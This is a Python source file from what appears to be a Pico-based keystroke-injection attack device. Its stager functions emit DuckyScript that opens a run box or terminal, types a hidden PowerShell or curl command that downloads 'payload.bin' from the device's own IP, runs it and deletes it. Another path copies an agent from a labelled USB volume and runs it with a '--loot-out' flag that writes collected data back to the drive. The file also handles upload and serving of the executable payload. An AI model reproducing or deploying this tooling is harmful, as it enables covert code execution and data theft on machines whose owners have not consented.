import gc
import os

from usb_agent_drive import AGENT_VOLUME_LABEL, usb_agent_filename

from ._http import (
    _FILE_CHUNK_SIZE,
    _MAX_BINARY_SIZE,
    _PAYLOAD_BIN,
    _STATIC_DIR,
)

_ALLOWED_BINARY_EXTENSIONS = {'bin', 'elf', 'exe', 'appimage'}
_USB_LOOT_FILE = 'loot-usb.json'
_MACH_O_MAGICS = (
    b'\xfe\xed\xfa\xce',
    b'\xce\xfa\xed\xfe',
    b'\xfe\xed\xfa\xcf',
    b'\xcf\xfa\xed\xfe',
    b'\xca\xfe\xba\xbe',
    b'\xbe\xba\xfe\xca',
    b'\xca\xfe\xba\xbf',
    b'\xbf\xba\xfe\xca',
)


def _sanitize_upload_filename(raw: str) -> str:
    normalized = (raw or '').replace('\\', '/').strip()
    if not normalized:
        return ''
    return normalized.rsplit('/', 1)[-1].strip()


def _is_supported_upload_name(name: str) -> bool:
    if not name or name in {'.', '..'}:
        return False
    if name.startswith('.'):
        return False
    if '.' not in name:
        return True
    extension = name.rsplit('.', 1)[-1].lower()
    return extension in _ALLOWED_BINARY_EXTENSIONS


def _looks_like_executable_binary(prefix: bytes) -> bool:
    if prefix.startswith(b'MZ'):
        return True
    if prefix.startswith(b'\x7fELF'):
        return True
    return prefix[:4] in _MACH_O_MAGICS


class _BinaryMixin:
    # Attributes provided by SetupServer.__init__
    _ap_ip: str

    # Methods provided by SetupServer / other mixins
    def _is_authorized(self, request) -> bool: ...
    async def _send_json(self, writer, request, status: str, data: dict[str, object]) -> None: ...
    async def _send_headers(self, writer, request, status: str, headers=None) -> None: ...

    def _ensure_static_dir(self) -> None:
        try:
            os.mkdir(_STATIC_DIR)
        except OSError as exc:
            if exc.args[0] != 17:  # EEXIST
                raise

    def _has_binary(self) -> bool:
        try:
            os.stat(_PAYLOAD_BIN)
            return True
        except OSError:
            return False

    async def _discard_request_body(self, reader, remaining: int) -> None:
        while remaining > 0:
            chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
            if not chunk:
                break
            remaining -= len(chunk)

    def _network_stager_script(self, target_os: str) -> str:
        url = 'http://' + self._ap_ip + '/static/payload.bin'
        if target_os == 'windows':
            cmd = (
                'powershell -w hidden -c "$p=Join-Path $env:TEMP '
                + "'pico_agent.exe'; iwr "
                + url
                + ' -OutFile $p; & $p; Remove-Item $p -Force -ErrorAction SilentlyContinue"'
            )
            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
        curl_cmd = (
            'curl -s '
            + url
            + ' -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent; '
            + 'rm -f /tmp/pico_agent'
        )
        if target_os == 'macos':
            return (
                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
                'DELAY 600\nSTRING ' + curl_cmd + '\nENTER'
            )
        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + curl_cmd + '\nENTER'

    def _usb_drive_stager_script(self, target_os: str) -> str:
        agent_name = usb_agent_filename(target_os)
        if target_os == 'windows':
            cmd = (
                'powershell -w hidden -c "$v=Get-Volume -FileSystemLabel '
                + AGENT_VOLUME_LABEL
                + " -ErrorAction SilentlyContinue; if($v){$s=$v.DriveLetter + ':/"
                + agent_name
                + "'; $loot=$v.DriveLetter + ':/"
                + _USB_LOOT_FILE
                + "'; $exe=Join-Path $env:TEMP 'pico_agent.exe'; "
                + 'Copy-Item $s $exe -Force; & $exe --loot-out $loot; '
                + 'Remove-Item $exe -Force -ErrorAction SilentlyContinue}"'
            )
            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'

        if target_os == 'macos':
            cmd = (
                'cp /Volumes/'
                + AGENT_VOLUME_LABEL
                + '/'
                + agent_name
                + ' /tmp/pico_agent && chmod +x /tmp/pico_agent && '
                + '/tmp/pico_agent --loot-out /Volumes/'
                + AGENT_VOLUME_LABEL
                + '/'
                + _USB_LOOT_FILE
                + '; rm -f /tmp/pico_agent'
            )
            return (
                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
                'DELAY 600\nSTRING ' + cmd + '\nENTER'
            )

        cmd = (
            'for d in /media/$USER/'
            + AGENT_VOLUME_LABEL
            + ' /run/media/$USER/'
            + AGENT_VOLUME_LABEL
            + '; do [ -f "$d/'
            + agent_name
            + '" ] && cp "$d/'
            + agent_name
            + '" /tmp/pico_agent && chmod +x /tmp/pico_agent && '
            + '/tmp/pico_agent --loot-out "$d/'
            + _USB_LOOT_FILE
            + '" ; rm -f /tmp/pico_agent; break; done'
        )
        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + cmd + '\nENTER'

    def _stager_script(self, target_os: str, delivery: str = 'network') -> str:
        if delivery == 'usb_drive':
            return self._usb_drive_stager_script(target_os)
        return self._network_stager_script(target_os)

    async def _handle_binary_upload_stream(
        self, reader, writer, partial, content_length: int
    ) -> None:
        if not self._is_authorized(partial):
            await self._send_json(
                writer, partial, '401 Unauthorized', {'message': 'Sign in required.'}
            )
            return

        if not content_length:
            await self._send_json(
                writer, partial, '400 Bad Request', {'message': 'No content received.'}
            )
            return

        fname = _sanitize_upload_filename(partial['headers'].get('x-filename', 'payload.bin'))
        if not _is_supported_upload_name(fname):
            await self._discard_request_body(reader, content_length)
            await self._send_json(
                writer,
                partial,
                '400 Bad Request',
                {
                    'message': 'Upload a compiled EXE, ELF, or Mach-O binary.',
                    'notice': 'error',
                },
            )
            return

        if content_length > _MAX_BINARY_SIZE:
            await self._discard_request_body(reader, content_length)
            await self._send_json(
                writer,
                partial,
                '413 Content Too Large',
                {
                    'message': (f'Binary too large (max {_MAX_BINARY_SIZE // (1024 * 1024)} MB).'),
                    'notice': 'error',
                },
            )
            return

        written = 0
        prefix = b''
        try:
            self._ensure_static_dir()
            gc.collect()
            with open(_PAYLOAD_BIN, 'wb') as f:
                remaining = content_length
                while remaining > 0:
                    chunk = await reader.read(min(_FILE_CHUNK_SIZE, remaining))
                    if not chunk:
                        break
                    if len(prefix) < 8:
                        prefix += chunk[: 8 - len(prefix)]
                    f.write(chunk)
                    written += len(chunk)
                    remaining -= len(chunk)
        except (OSError, MemoryError):
            await self._send_json(
                writer,
                partial,
                '500 Internal Server Error',
                {'message': 'Write failed. Check available flash space.', 'notice': 'error'},
            )
            return

        if not _looks_like_executable_binary(prefix):
            try:
                os.remove(_PAYLOAD_BIN)
            except OSError:
                pass
            await self._send_json(
                writer,
                partial,
                '400 Bad Request',
                {
                    'message': 'Only executable EXE, ELF, or Mach-O binaries can be uploaded.',
                    'notice': 'error',
                },
            )
            return

        await self._send_json(
            writer,
            partial,
            '200 OK',
            {
                'message': f'Binary uploaded ({written} bytes).',
                'notice': 'success',
                'size': written,
                'filename': fname,
            },
        )

    async def _serve_payload(self, writer, request) -> None:
        try:
            fstat = os.stat(_PAYLOAD_BIN)
            file_size = fstat[6]
        except OSError:
            await self._send_json(
                writer, request, '404 Not Found', {'message': 'No payload staged.'}
            )
            return
        await self._send_headers(
            writer,
            request,
            '200 OK',
            headers={
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': 'attachment; filename="payload.bin"',
                'Content-Length': str(file_size),
            },
        )
        try:
            with open(_PAYLOAD_BIN, 'rb') as fh:
                while True:
                    chunk = fh.read(_FILE_CHUNK_SIZE)
                    if not chunk:
                        break
                    writer.write(chunk)
                    await writer.drain()
        except OSError:
            pass
